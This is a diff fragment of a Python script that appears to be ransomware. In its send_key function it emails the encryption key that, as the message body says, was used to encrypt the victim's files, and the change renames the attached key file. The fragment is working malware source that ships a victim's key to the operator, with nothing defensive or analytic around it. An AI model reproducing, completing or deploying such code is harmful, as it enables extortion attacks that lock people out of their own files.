@@ -51,7 +51,7 @@ def send_key():
         msg['Subject'] = "The second key generate by the reboot of system"
         body = "The server you sending a key from the client, the script encrypted her files with this key."
         msg.attach(MIMEText(body, 'plain'))
-        filename = "{}.key".format(current_user)
+        filename = "{}.key".format(usrkey)
         attachment = open(filename, "rb")
         p = MIMEBase('application', 'octet-stream')
         p.set_payload((attachment).read())
